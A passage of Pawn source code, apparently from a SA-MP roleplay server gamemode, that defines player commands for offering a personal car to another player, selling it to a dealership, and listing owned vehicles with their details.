	&& PlayerInfo[playerid][pCarkey7] == 0 && PlayerInfo[playerid][pCarkey8] == 0 && PlayerInfo[playerid][pCarkey9] == 0 && PlayerInfo[playerid][pCarkey10] == 0
	&& PlayerInfo[playerid][pCarkey11] == 0 && PlayerInfo[playerid][pCarkey12] == 0 && PlayerInfo[playerid][pCarkey13] == 0
	&& PlayerInfo[playerid][pCarkey14] == 0 && PlayerInfo[playerid][pCarkey15] == 0) return SendClientMessage(playerid,COLOR_SERVER,"{FFB870}You do not have a vehicle.");
	new id,price,sendername[30],giveplayer[30],VehI = OwnedVeh(GetPlayerVehicleID(playerid)),other[128];
	if(sscanf(params, "uiS(NULL)", id,price,other)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/sellcarto <Name/Playerid> <price>");
	if(strcmp(other, "NULL", true)) return SCM(playerid,COLOR_SERVER,"Do not use spaces in the price.");
	if(id == playerid) return SendClientMessage(playerid,COLOR_SERVER,"You can not sell the car alone.");
	if(price < 1 || price > 500000000) return SendClientMessage(playerid, COLOR_GREY, "{FFB870}Price not lower then 1 and not higher then $500,000,000.");
	new vid = GetPlayerVehicleID(playerid);
    if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "You're in your own car.");
	if(vid != personalcar[0][playerid] && vid != personalcar[1][playerid] && vid != personalcar[2][playerid] && vid != personalcar[3][playerid] && vid != personalcar[4][playerid] && vid != personalcar[5][playerid]
	&& vid != personalcar[6][playerid] && vid != personalcar[7][playerid] && vid != personalcar[8][playerid] && vid != personalcar[9][playerid] && vid != personalcar[10][playerid]
	&& vid != personalcar[11][playerid] && vid != personalcar[12][playerid] && vid != personalcar[13][playerid] && vid != personalcar[14][playerid]) return SendClientMessage(playerid, COLOR_SERVER, "Nu esti in masina personala.");
	if(GetPlayerCash(id) < price) return SCM(playerid,COLOR_SERVER,"{FFB870}This player don't have money needed.");
	if(PlayerInfo[playerid][pLevel] < 4) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You don't have level 4.");
	if(PlayerInfo[id][pLevel] < 4) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}That player doesn't have level 4.");
	if(VehI != PlayerInfo[playerid][pPcarkey] && VehI != PlayerInfo[playerid][pmotokey] && VehI != PlayerInfo[playerid][pprcarkey] && VehI != PlayerInfo[playerid][pprcarkey2] && VehI != PlayerInfo[playerid][pPPluscarkey] && VehI != PlayerInfo[playerid][pPPluscarkey2]
	&& VehI != PlayerInfo[playerid][pCarkey7] && VehI != PlayerInfo[playerid][pCarkey8] && VehI != PlayerInfo[playerid][pCarkey9] && VehI != PlayerInfo[playerid][pCarkey10] 
	&& VehI != PlayerInfo[playerid][pCarkey11] && VehI != PlayerInfo[playerid][pCarkey12] && VehI != PlayerInfo[playerid][pCarkey13]
	&& VehI != PlayerInfo[playerid][pCarkey14] && VehI != PlayerInfo[playerid][pCarkey15])
	    return SendClientMessage(playerid, COLOR_SERVER, "This is not your car.");
	GetPlayerName(playerid, sendername, sizeof(sendername));
	GetPlayerName(id, giveplayer, sizeof(giveplayer));
	if(IsPlayerConnected(id))
	{
	    if(IsPlayerInRangeOfPlayer(playerid, id, 5.0))
	    {
			/*if(PlayerInfo[id][pPcarkey] != 0 && PlayerInfo[id][pmotokey] != 0 && PlayerInfo[id][pPremiumAccount] == 0) return SCM(playerid, -1, "{FFB870}Acest player nu are loc in garaj.");
			if(PlayerInfo[id][pPcarkey] != 0 && PlayerInfo[id][pmotokey] != 0 && personalcar[2][id] != 0 && personalcar[3][id] != 0) return SCM(playerid, -1, "{FFB870}Acest player nu are loc in garaj.");
			if(PlayerInfo[id][pPcarkey] != 0 && PlayerInfo[id][pmotokey] != 0 && personalcar[2][id] != 0 && personalcar[3][id] != 0
			&& personalcar[4][id] != 0 && personalcar[5][id] != 0) return SCM(playerid, -1, "{FFB870}Acest player nu are loc in garaj.");*/
			new vehh = GetPlayerVehicleID(playerid),string[256];
	   		if(vehh == personalcar[0][playerid])
	   		{
	   	        primesccar[id] = 1;
	   	        CarID[id] = OwnedVeh(personalcar[0][playerid]);
			}
			if(vehh == personalcar[1][playerid])
	   		{
	   	        primesccar[id] = 2;
	   	        CarID[id] = OwnedVeh(personalcar[1][playerid]);
			}
			if(vehh == personalcar[2][playerid])
	   		{
	   	        primesccar[id] = 3;
	   	        CarID[id] = OwnedVeh(personalcar[2][playerid]);
			}
			if(vehh == personalcar[3][playerid])
	   		{
	   	        primesccar[id] = 4;
	   	        CarID[id] = OwnedVeh(personalcar[3][playerid]);
			}
			if(vehh == personalcar[4][playerid])
	   		{
	   	        primesccar[id] = 5;
	   	        CarID[id] = OwnedVeh(personalcar[4][playerid]);
			}
			if(vehh == personalcar[5][playerid])
	   		{
	   	        primesccar[id] = 6;
	   	        CarID[id] = OwnedVeh(personalcar[5][playerid]);
			}
			if(vehh == personalcar[6][playerid])
	   		{
	   	        primesccar[id] = 7;
	   	        CarID[id] = OwnedVeh(personalcar[6][playerid]);
			}
			if(vehh == personalcar[7][playerid])
	   		{
	   	        primesccar[id] = 8;
	   	        CarID[id] = OwnedVeh(personalcar[7][playerid]);
			}
			if(vehh == personalcar[8][playerid])
	   		{
	   	        primesccar[id] = 9;
	   	        CarID[id] = OwnedVeh(personalcar[8][playerid]);
			}
			if(vehh == personalcar[9][playerid])
	   		{
	   	        primesccar[id] = 10;
	   	        CarID[id] = OwnedVeh(personalcar[9][playerid]);
			}
			if(vehh == personalcar[10][playerid])
	   		{
	   	        primesccar[id] = 11;
	   	        CarID[id] = OwnedVeh(personalcar[10][playerid]);
			}
			if(vehh == personalcar[11][playerid])
	   		{
	   	        primesccar[id] = 12;
	   	        CarID[id] = OwnedVeh(personalcar[11][playerid]);
			}
			if(vehh == personalcar[12][playerid])
	   		{
	   	        primesccar[id] = 13;
	   	        CarID[id] = OwnedVeh(personalcar[12][playerid]);
			}
			if(vehh == personalcar[13][playerid])
	   		{
	   	        primesccar[id] = 14;
	   	        CarID[id] = OwnedVeh(personalcar[13][playerid]);
			}
			if(vehh == personalcar[14][playerid])
	   		{
	   	        primesccar[id] = 15;
	   	        CarID[id] = OwnedVeh(personalcar[14][playerid]);
			}
			new vehhh = OwnedVeh(GetPlayerVehicleID(playerid));
			if(vehhh == PlayerInfo[playerid][pPcarkey])
			{
			    cartype[id] = 1;
			}
			if(vehhh == PlayerInfo[playerid][pmotokey])
			{
			    cartype[id] = 2;
			}
			if(vehhh == PlayerInfo[playerid][pprcarkey])
			{
			    cartype[id] = 3;
			}
			if(vehhh == PlayerInfo[playerid][pprcarkey2])
			{
			    cartype[id] = 4;
			}
			if(vehhh == PlayerInfo[playerid][pPPluscarkey])
			{
			    cartype[id] = 5;
			}
			if(vehhh == PlayerInfo[playerid][pPPluscarkey2])
			{
			    cartype[id] = 6;
			}
			if(vehhh == PlayerInfo[playerid][pCarkey7])
			{
			    cartype[id] = 7;
			}
			if(vehhh == PlayerInfo[playerid][pCarkey8])
			{
			    cartype[id] = 8;
			}
			if(vehhh == PlayerInfo[playerid][pCarkey9])
			{
			    cartype[id] = 9;
			}
			if(vehhh == PlayerInfo[playerid][pCarkey10])
			{
			    cartype[id] = 10;
			}
			if(vehhh == PlayerInfo[playerid][pCarkey11])
			{
			    cartype[id] = 11;
			}
			if(vehhh == PlayerInfo[playerid][pCarkey12])
			{
			    cartype[id] = 12;
			}
			if(vehhh == PlayerInfo[playerid][pCarkey13])
			{
			    cartype[id] = 13;
			}
			if(vehhh == PlayerInfo[playerid][pCarkey14])
			{
			    cartype[id] = 14;
			}
			if(vehhh == PlayerInfo[playerid][pCarkey15])
			{
			    cartype[id] = 15;
			}
			ofercar[id] = playerid;
   			carprice[id] = price;
			format(string, sizeof(string), "* You have offered your car(%s) to %s(%d) for $%s.", CarInfo[vehhh][cDescription],giveplayer,id,FormatNumber(price));
			SendClientMessage(playerid, COLOR_GREEN, string);
			format(string, sizeof(string), "* %s offered his car(%s) to you for $%s (type /accept vehicle %d) to buy.", sendername, CarInfo[vehhh][cDescription], FormatNumber(price),playerid);
			SendClientMessage(id, COLOR_GREEN, string);
		}
		else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Player is not near you.");
	}
	return 1;
}

CMD:selltods(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if(PlayerInfo[playerid][pPcarkey] == 0 && PlayerInfo[playerid][pmotokey] == 0 && PlayerInfo[playerid][phelikey] == 0 && PlayerInfo[playerid][pprcarkey] == 0 && PlayerInfo[playerid][pPPluscarkey] == 0 && PlayerInfo[playerid][pPPluscarkey2] == 0
		&& PlayerInfo[playerid][pCarkey7] == 0 && PlayerInfo[playerid][pCarkey8] == 0 && PlayerInfo[playerid][pCarkey9] == 0 && PlayerInfo[playerid][pCarkey10] == 0 && 
		PlayerInfo[playerid][pCarkey11] == 0 && PlayerInfo[playerid][pCarkey12] == 0 && PlayerInfo[playerid][pCarkey13] == 0
		&& PlayerInfo[playerid][pCarkey14] == 0 && PlayerInfo[playerid][pCarkey15] == 0) return SendClientMessage(playerid,COLOR_SERVER,"{FFB870}You do not have a vehicle.");
		if(!IsPlayerInRangeOfPoint(playerid, 10.0, 1574.8773,-1274.0566,17.6131)) return SCM(playerid,COLOR_SERVER,"{FFB870}You're at the place where you can sell your car.");
		new vehh = GetPlayerVehicleID(playerid);
		if(vehh != personalcar[0][playerid] && vehh != personalcar[1][playerid] && vehh != personalcar[2][playerid] && vehh != personalcar[3][playerid] && vehh != personalcar[4][playerid] && vehh != personalcar[5][playerid]
		&& vehh != personalcar[6][playerid] && vehh != personalcar[7][playerid] && vehh != personalcar[8][playerid] && vehh != personalcar[10][playerid] && vehh != personalcar[9][playerid]
		&& vehh != personalcar[11][playerid] && vehh != personalcar[12][playerid] && vehh != personalcar[13][playerid] && vehh != personalcar[14][playerid])
			return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You have to sit at your own car to sell it.");
		if(vehh == personalcar[0][playerid])
		{
		    //new idc = OwnedVeh(personalcar[0][playerid]);
		    //if(CarInfo[idc][cModel] == 539 || CarInfo[idc][cModel] == 502 || CarInfo[idc][cModel] == 503 || CarInfo[idc][cModel] == 494 || CarInfo[idc][cModel] == 487 || CarInfo[idc][cModel] == 447) return SendClientMessage(playerid, COLOR_SERVER, "This car can't be sold to the DealerShip.");
			new cashveh,string[80];
			CarID[playerid] = personalcar[0][playerid];
 			cashveh = floatround(floatmul(CarInfo[OwnedVeh(personalcar[0][playerid])][cValue],0.60),floatround_ceil);
			format(string,sizeof(string),"Are you sure you sell your car for $%s?",FormatNumber(cashveh));
			ShowPlayerDialog(playerid, DIALOG_CARSELL, DIALOG_STYLE_MSGBOX, "Sellcar:", string, "Yes", "No");
		}
		if(vehh == personalcar[1][playerid])
		{
		    //new idc = OwnedVeh(personalcar[1][playerid]);
		    //if(CarInfo[idc][cModel] == 539 || CarInfo[idc][cModel] == 502 || CarInfo[idc][cModel] == 503 || CarInfo[idc][cModel] == 494 || CarInfo[idc][cModel] == 487 || CarInfo[idc][cModel] == 447) return SendClientMessage(playerid, COLOR_SERVER, "This car can't be sold to the DealerShip.");
			new cashveh,string[80];
			CarID[playerid] = personalcar[1][playerid];
 			cashveh = floatround(floatmul(CarInfo[OwnedVeh(personalcar[1][playerid])][cValue],0.60),floatround_ceil);
			format(string,sizeof(string),"Are you sure you sell your car for $%s?",FormatNumber(cashveh));
			ShowPlayerDialog(playerid, DIALOG_CARSELL, DIALOG_STYLE_MSGBOX, "Sellcar:", string, "Yes", "No");
		}
		if(vehh == personalcar[2][playerid])
		{
		    //new idc = OwnedVeh(personalcar[2][playerid]);
		    //if(CarInfo[idc][cModel] == 539 || CarInfo[idc][cModel] == 502 || CarInfo[idc][cModel] == 503 || CarInfo[idc][cModel] == 494 || CarInfo[idc][cModel] == 487 || CarInfo[idc][cModel] == 447) return SendClientMessage(playerid, COLOR_SERVER, "This car can't be sold to the DealerShip.");
			new cashveh,string[80];
			CarID[playerid] = personalcar[2][playerid];
 			cashveh = floatround(floatmul(CarInfo[OwnedVeh(personalcar[2][playerid])][cValue],0.60),floatround_ceil);
			format(string,sizeof(string),"Are you sure you sell your car for $%s?",FormatNumber(cashveh));
			ShowPlayerDialog(playerid, DIALOG_CARSELL, DIALOG_STYLE_MSGBOX, "Sellcar:", string, "Yes", "No");
		}
		if(vehh == personalcar[3][playerid])
		{
		    //new idc = OwnedVeh(personalcar[3][playerid]);
		    //if(CarInfo[idc][cModel] == 539 || CarInfo[idc][cModel] == 502 || CarInfo[idc][cModel] == 503 || CarInfo[idc][cModel] == 494 || CarInfo[idc][cModel] == 487 || CarInfo[idc][cModel] == 447) return SendClientMessage(playerid, COLOR_SERVER, "This car can't be sold to the DealerShip.");
			new cashveh,string[80];
			CarID[playerid] = personalcar[3][playerid];
 			cashveh = floatround(floatmul(CarInfo[OwnedVeh(personalcar[3][playerid])][cValue],0.60),floatround_ceil);
			format(string,sizeof(string),"Are you sure you sell your car for $%s?",FormatNumber(cashveh));
			ShowPlayerDialog(playerid, DIALOG_CARSELL, DIALOG_STYLE_MSGBOX, "Sellcar:", string, "Yes", "No");
		}
		if(vehh == personalcar[4][playerid])
		{
		   // new idc = OwnedVeh(personalcar[4][playerid]);
		    //if(CarInfo[idc][cModel] == 539 || CarInfo[idc][cModel] == 502 || CarInfo[idc][cModel] == 503 || CarInfo[idc][cModel] == 494 || CarInfo[idc][cModel] == 487 || CarInfo[idc][cModel] == 447) return SendClientMessage(playerid, COLOR_SERVER, "This car can't be sold to the DealerShip.");
			new cashveh,string[80];
			CarID[playerid] = personalcar[4][playerid];
 			cashveh = floatround(floatmul(CarInfo[OwnedVeh(personalcar[4][playerid])][cValue],0.60),floatround_ceil);
			format(string,sizeof(string),"Are you sure you sell your car for $%s?",FormatNumber(cashveh));
			ShowPlayerDialog(playerid, DIALOG_CARSELL, DIALOG_STYLE_MSGBOX, "Sellcar:", string, "Yes", "No");
		}
		if(vehh == personalcar[5][playerid])
		{
		    //new idc = OwnedVeh(personalcar[5][playerid]);
		    //if(CarInfo[idc][cModel] == 539 || CarInfo[idc][cModel] == 502 || CarInfo[idc][cModel] == 503 || CarInfo[idc][cModel] == 494 || CarInfo[idc][cModel] == 487 || CarInfo[idc][cModel] == 447) return SendClientMessage(playerid, COLOR_SERVER, "This car can't be sold to the DealerShip.");
			new cashveh,string[80];
			CarID[playerid] = personalcar[5][playerid];
 			cashveh = floatround(floatmul(CarInfo[OwnedVeh(personalcar[5][playerid])][cValue],0.60),floatround_ceil);
			format(string,sizeof(string),"Are you sure you sell your car for $%s?",FormatNumber(cashveh));
			ShowPlayerDialog(playerid, DIALOG_CARSELL, DIALOG_STYLE_MSGBOX, "Sellcar:", string, "Yes", "No");
		}
		if(vehh == personalcar[6][playerid])
		{
		    //new idc = OwnedVeh(personalcar[6][playerid]);
		    //if(CarInfo[idc][cModel] == 539 || CarInfo[idc][cModel] == 502 || CarInfo[idc][cModel] == 503 || CarInfo[idc][cModel] == 494 || CarInfo[idc][cModel] == 487 || CarInfo[idc][cModel] == 447) return SendClientMessage(playerid, COLOR_SERVER, "This car can't be sold to the DealerShip.");
			new cashveh,string[80];
			CarID[playerid] = personalcar[6][playerid];
 			cashveh = floatround(floatmul(CarInfo[OwnedVeh(personalcar[6][playerid])][cValue],0.60),floatround_ceil);
			format(string,sizeof(string),"Are you sure you sell your car for $%s?",FormatNumber(cashveh));
			ShowPlayerDialog(playerid, DIALOG_CARSELL, DIALOG_STYLE_MSGBOX, "Sellcar:", string, "Yes", "No");
		}
		if(vehh == personalcar[7][playerid])
		{
		    //new idc = OwnedVeh(personalcar[7][playerid]);
		    //if(CarInfo[idc][cModel] == 539 || CarInfo[idc][cModel] == 502 || CarInfo[idc][cModel] == 503 || CarInfo[idc][cModel] == 494 || CarInfo[idc][cModel] == 487 || CarInfo[idc][cModel] == 447) return SendClientMessage(playerid, COLOR_SERVER, "This car can't be sold to the DealerShip.");
			new cashveh,string[80];
			CarID[playerid] = personalcar[7][playerid];
 			cashveh = floatround(floatmul(CarInfo[OwnedVeh(personalcar[7][playerid])][cValue],0.60),floatround_ceil);
			format(string,sizeof(string),"Are you sure you sell your car for $%s?",FormatNumber(cashveh));
			ShowPlayerDialog(playerid, DIALOG_CARSELL, DIALOG_STYLE_MSGBOX, "Sellcar:", string, "Yes", "No");
		}
		if(vehh == personalcar[8][playerid])
		{
		    //new idc = OwnedVeh(personalcar[8][playerid]);
		    //if(CarInfo[idc][cModel] == 539 || CarInfo[idc][cModel] == 502 || CarInfo[idc][cModel] == 503 || CarInfo[idc][cModel] == 494 || CarInfo[idc][cModel] == 487 || CarInfo[idc][cModel] == 447) return SendClientMessage(playerid, COLOR_SERVER, "This car can't be sold to the DealerShip.");
			new cashveh,string[80];
			CarID[playerid] = personalcar[8][playerid];
 			cashveh = floatround(floatmul(CarInfo[OwnedVeh(personalcar[8][playerid])][cValue],0.60),floatround_ceil);
			format(string,sizeof(string),"Are you sure you sell your car for $%s?",FormatNumber(cashveh));
			ShowPlayerDialog(playerid, DIALOG_CARSELL, DIALOG_STYLE_MSGBOX, "Sellcar:", string, "Yes", "No");
		}
		if(vehh == personalcar[9][playerid])
		{
		    //new idc = OwnedVeh(personalcar[9][playerid]);
		    //if(CarInfo[idc][cModel] == 539 || CarInfo[idc][cModel] == 502 || CarInfo[idc][cModel] == 503 || CarInfo[idc][cModel] == 494 || CarInfo[idc][cModel] == 487 || CarInfo[idc][cModel] == 447) return SendClientMessage(playerid, COLOR_SERVER, "This car can't be sold to the DealerShip.");
			new cashveh,string[80];
			CarID[playerid] = personalcar[9][playerid];
 			cashveh = floatround(floatmul(CarInfo[OwnedVeh(personalcar[9][playerid])][cValue],0.60),floatround_ceil);
			format(string,sizeof(string),"Are you sure you sell your car for $%s?",FormatNumber(cashveh));
			ShowPlayerDialog(playerid, DIALOG_CARSELL, DIALOG_STYLE_MSGBOX, "Sellcar:", string, "Yes", "No");
		}
		new doarodata = 0;
		for(new idcar = 10; idcar < 15; idcar++)
		{
			if(doarodata == 0)
			{
				if(vehh == personalcar[idcar][playerid])
				{
					doarodata = 1;
					//new idc = OwnedVeh(personalcar[idcar][playerid]);
					//if(CarInfo[idc][cModel] == 539 || CarInfo[idc][cModel] == 502 || CarInfo[idc][cModel] == 503 || CarInfo[idc][cModel] == 494 || CarInfo[idc][cModel] == 487 || CarInfo[idc][cModel] == 447) return SendClientMessage(playerid, COLOR_SERVER, "This car can't be sold to the DealerShip.");
					new cashveh,string[80];
					CarID[playerid] = personalcar[idcar][playerid];
					cashveh = floatround(floatmul(CarInfo[OwnedVeh(personalcar[idcar][playerid])][cValue],0.60),floatround_ceil);
					format(string,sizeof(string),"Are you sure you sell your car for $%s?",FormatNumber(cashveh));
					ShowPlayerDialog(playerid, DIALOG_CARSELL, DIALOG_STYLE_MSGBOX, "Sellcar:", string, "Yes", "No");
				}
			}	
		}	
	}
	return 1;
}
CMD:sellcar(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	return cmd_selltods(playerid, params);
}
CMD:vehicles(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pPcarkey] == 0 && PlayerInfo[playerid][pmotokey] == 0 && PlayerInfo[playerid][phelikey] == 0 && PlayerInfo[playerid][pprcarkey] == 0 && PlayerInfo[playerid][pprcarkey2] == 0 && PlayerInfo[playerid][pPPluscarkey] == 0 && PlayerInfo[playerid][pPPluscarkey2] == 0
	&& PlayerInfo[playerid][pCarkey7] == 0 && PlayerInfo[playerid][pCarkey8] == 0 && PlayerInfo[playerid][pCarkey9] == 0 && PlayerInfo[playerid][pCarkey10] == 0
	&& PlayerInfo[playerid][pCarkey11] == 0 && PlayerInfo[playerid][pCarkey12] == 0 && PlayerInfo[playerid][pCarkey13] == 0
	&& PlayerInfo[playerid][pCarkey14] == 0 && PlayerInfo[playerid][pCarkey15] == 0) return SendClientMessage(playerid,COLOR_SERVER,"{FFB870}You do not have a vehicle.");
	new sendername[25],name[100];
	GetPlayerName(playerid,sendername,sizeof(sendername));
	format(name,sizeof(name),"** %s's vehicles **",sendername);
	SCM(playerid,COLOR_TUTORIAL,name);
    if(PlayerInfo[playerid][pPcarkey] != 0)
    {
		new string[356],carid = PlayerInfo[playerid][pPcarkey],locked[6];
		if(CarInfo[carid][cLock] == 1)
		{
		    locked = "Yes";
		}
		else
		{
		    locked = "No";
		}
		format(string,sizeof(string),"Vehicle 1: Model:[%s] Locked:[%s] KM:[%.0f] TD:[%d] Insurance:[%d] InsuranceP:[%d] Value:[%s]",CarInfo[carid][cDescription],locked,CarInfo[carid][cKM],CarInfo[carid][cTimed],CarInfo[carid][cInsurancecar],CarInfo[carid][cInscarprice],FormatNumber(CarInfo[carid][cValue]));
		SCM(playerid,COLOR_GRAD1,string);
	}
	if(PlayerInfo[playerid][pmotokey] != 0)
    {
		new string[356],carid = PlayerInfo[playerid][pmotokey],locked[6];
		if(CarInfo[carid][cLock] == 1)
		{
		    locked = "Yes";
		}
		else
		{
		    locked = "No";
		}
		format(string,sizeof(string),"Vehicle 2: Model:[%s] Locked:[%s] KM:[%.0f] TD:[%d] Insurance:[%d] InsuranceP:[%d] Value:[%s]",CarInfo[carid][cDescription],locked,CarInfo[carid][cKM],CarInfo[carid][cTimed],CarInfo[carid][cInsurancecar],CarInfo[carid][cInscarprice],FormatNumber(CarInfo[carid][cValue]));
		SCM(playerid,COLOR_GRAD1,string);
	}
	if(PlayerInfo[playerid][pprcarkey] != 0)
	{
		new string[356],carid = PlayerInfo[playerid][pprcarkey],locked[6];
		if(CarInfo[carid][cLock] == 1)
		{
		    locked = "Yes";
		}
		else
		{
		    locked = "No";
		}
		format(string,sizeof(string),"Vehicle 3: Model:[%s] Locked:[%s] KM:[%.0f] TD:[%d] Insurance:[%d] InsuranceP:[%d] Value:[%s]",CarInfo[carid][cDescription],locked,CarInfo[carid][cKM],CarInfo[carid][cTimed],CarInfo[carid][cInsurancecar],CarInfo[carid][cInscarprice],FormatNumber(CarInfo[carid][cValue]));
		SCM(playerid,COLOR_GRAD4,string);
	}
	if(PlayerInfo[playerid][pprcarkey2] != 0)
	{
		new string[356],carid = PlayerInfo[playerid][pprcarkey2],locked[6];
		if(CarInfo[carid][cLock] == 1)
		{
		    locked = "Yes";
		}
		else
		{
		    locked = "No";
		}
		format(string,sizeof(string),"Vehicle 4: Model:[%s] Locked:[%s] KM:[%.0f] TD:[%d] Insurance:[%d] InsuranceP:[%d] Value:[%s]",CarInfo[carid][cDescription],locked,CarInfo[carid][cKM],CarInfo[carid][cTimed],CarInfo[carid][cInsurancecar],CarInfo[carid][cInscarprice],FormatNumber(CarInfo[carid][cValue]));
		SCM(playerid,COLOR_GRAD4,string);
	}
	if(PlayerInfo[playerid][pPPluscarkey] != 0)
	{
		new string[356],carid = PlayerInfo[playerid][pPPluscarkey],locked[6];
		if(CarInfo[carid][cLock] == 1)
		{
		    locked = "Yes";
		}
		else
		{
		    locked = "No";
		}
		format(string,sizeof(string),"Vehicle 5: Model:[%s] Locked:[%s] KM:[%.0f] TD:[%d] Insurance:[%d] InsuranceP:[%d] Value:[%s]",CarInfo[carid][cDescription],locked,CarInfo[carid][cKM],CarInfo[carid][cTimed],CarInfo[carid][cInsurancecar],CarInfo[carid][cInscarprice],FormatNumber(CarInfo[carid][cValue]));
		SCM(playerid,COLOR_GRAD4,string);
	}
	if(PlayerInfo[playerid][pPPluscarkey2] != 0)
	{
		new string[356],carid = PlayerInfo[playerid][pPPluscarkey2],locked[6];
		if(CarInfo[carid][cLock] == 1)
		{
		    locked = "Yes";
		}
		else
		{
		    locked = "No";
		}
		format(string,sizeof(string),"Vehicle 6: Model:[%s] Locked:[%s] KM:[%.0f] TD:[%d] Insurance:[%d] InsuranceP:[%d] Value:[%s]",CarInfo[carid][cDescription],locked,CarInfo[carid][cKM],CarInfo[carid][cTimed],CarInfo[carid][cInsurancecar],CarInfo[carid][cInscarprice],FormatNumber(CarInfo[carid][cValue]));
		SCM(playerid,COLOR_GRAD4,string);
	}
	if(PlayerInfo[playerid][pCarkey7] != 0)
    {
		new string[356],carid = PlayerInfo[playerid][pCarkey7],locked[6];
		if(CarInfo[carid][cLock] == 1)
		{
		    locked = "Yes";
		}
		else
		{
		    locked = "No";
		}
		format(string,sizeof(string),"Vehicle 7: Model:[%s] Locked:[%s] KM:[%.0f] TD:[%d] Insurance:[%d] InsuranceP:[%d] Value:[%s]",CarInfo[carid][cDescription],locked,CarInfo[carid][cKM],CarInfo[carid][cTimed],CarInfo[carid][cInsurancecar],CarInfo[carid][cInscarprice],FormatNumber(CarInfo[carid][cValue]));
		SCM(playerid,COLOR_GRAD1,string);
	}
	if(PlayerInfo[playerid][pCarkey8] != 0)
    {
		new string[356],carid = PlayerInfo[playerid][pCarkey8],locked[6];
		if(CarInfo[carid][cLock] == 1)
		{
		    locked = "Yes";
		}
		else
		{
		    locked = "No";
		}
		format(string,sizeof(string),"Vehicle 8: Model:[%s] Locked:[%s] KM:[%.0f] TD:[%d] Insurance:[%d] InsuranceP:[%d] Value:[%s]",CarInfo[carid][cDescription],locked,CarInfo[carid][cKM],CarInfo[carid][cTimed],CarInfo[carid][cInsurancecar],CarInfo[carid][cInscarprice],FormatNumber(CarInfo[carid][cValue]));
		SCM(playerid,COLOR_GRAD1,string);
	}
	if(PlayerInfo[playerid][pCarkey9] != 0)
    {
		new string[356],carid = PlayerInfo[playerid][pCarkey9],locked[6];
		if(CarInfo[carid][cLock] == 1)
		{
		    locked = "Yes";
		}
		else
		{
		    locked = "No";
		}
		format(string,sizeof(string),"Vehicle 9: Model:[%s] Locked:[%s] KM:[%.0f] TD:[%d] Insurance:[%d] InsuranceP:[%d] Value:[%s]",CarInfo[carid][cDescription],locked,CarInfo[carid][cKM],CarInfo[carid][cTimed],CarInfo[carid][cInsurancecar],CarInfo[carid][cInscarprice],FormatNumber(CarInfo[carid][cValue]));
		SCM(playerid,COLOR_GRAD1,string);
	}
	if(PlayerInfo[playerid][pCarkey10] != 0)
    {
		new string[356],carid = PlayerInfo[playerid][pCarkey10],locked[6];
		if(CarInfo[carid][cLock] == 1)
		{
		    locked = "Yes";
		}
		else
		{
		    locked = "No";
		}
		format(string,sizeof(string),"Vehicle 10: Model:[%s] Locked:[%s] KM:[%.0f] TD:[%d] Insurance:[%d] InsuranceP:[%d] Value:[%s]",CarInfo[carid][cDescription],locked,CarInfo[carid][cKM],CarInfo[carid][cTimed],CarInfo[carid][cInsurancecar],CarInfo[carid][cInscarprice],FormatNumber(CarInfo[carid][cValue]));
		SCM(playerid,COLOR_GRAD1,string);
	}
	if(PlayerInfo[playerid][pCarkey11] != 0)
    {
		new string[356],carid = PlayerInfo[playerid][pCarkey11],locked[6];
		if(CarInfo[carid][cLock] == 1)
		{
		    locked = "Yes";
		}
		else
		{
		    locked = "No";
		}
		format(string,sizeof(string),"Vehicle 11: Model:[%s] Locked:[%s] KM:[%.0f] TD:[%d] Insurance:[%d] InsuranceP:[%d] Value:[%s]",CarInfo[carid][cDescription],locked,CarInfo[carid][cKM],CarInfo[carid][cTimed],CarInfo[carid][cInsurancecar],CarInfo[carid][cInscarprice],FormatNumber(CarInfo[carid][cValue]));
		SCM(playerid,COLOR_GRAD1,string);
	}
	if(PlayerInfo[playerid][pCarkey12] != 0)
    {
		new string[356],carid = PlayerInfo[playerid][pCarkey12],locked[6];
		if(CarInfo[carid][cLock] == 1)
		{
		    locked = "Yes";
		}
		else
		{
		    locked = "No";
		}
		format(string,sizeof(string),"Vehicle 12: Model:[%s] Locked:[%s] KM:[%.0f] TD:[%d] Insurance:[%d] InsuranceP:[%d] Value:[%s]",CarInfo[carid][cDescription],locked,CarInfo[carid][cKM],CarInfo[carid][cTimed],CarInfo[carid][cInsurancecar],CarInfo[carid][cInscarprice],FormatNumber(CarInfo[carid][cValue]));
		SCM(playerid,COLOR_GRAD1,string);
	}
	if(PlayerInfo[playerid][pCarkey13] != 0)
    {
		new string[356],carid = PlayerInfo[playerid][pCarkey13],locked[6];
		if(CarInfo[carid][cLock] == 1)
		{
		    locked = "Yes";
		}
		else
		{
		    locked = "No";
		}
		format(string,sizeof(string),"Vehicle 13: Model:[%s] Locked:[%s] KM:[%.0f] TD:[%d] Insurance:[%d] InsuranceP:[%d] Value:[%s]",CarInfo[carid][cDescription],locked,CarInfo[carid][cKM],CarInfo[carid][cTimed],CarInfo[carid][cInsurancecar],CarInfo[carid][cInscarprice],FormatNumber(CarInfo[carid][cValue]));
		SCM(playerid,COLOR_GRAD1,string);
	}
	if(PlayerInfo[playerid][pCarkey14] != 0)
    {
		new string[356],carid = PlayerInfo[playerid][pCarkey14],locked[6];
		if(CarInfo[carid][cLock] == 1)
		{
		    locked = "Yes";
		}
		else
		{
		    locked = "No";
		}
		format(string,sizeof(string),"Vehicle 14: Model:[%s] Locked:[%s] KM:[%.0f] TD:[%d] Insurance:[%d] InsuranceP:[%d] Value:[%s]",CarInfo[carid][cDescription],locked,CarInfo[carid][cKM],CarInfo[carid][cTimed],CarInfo[carid][cInsurancecar],CarInfo[carid][cInscarprice],FormatNumber(CarInfo[carid][cValue]));
		SCM(playerid,COLOR_GRAD1,string);
	}
	if(PlayerInfo[playerid][pCarkey15] != 0)
    {
		new string[356],carid = PlayerInfo[playerid][pCarkey15],locked[6];
		if(CarInfo[carid][cLock] == 1)
		{
		    locked = "Yes";
		}
		else
		{
		    locked = "No";
		}
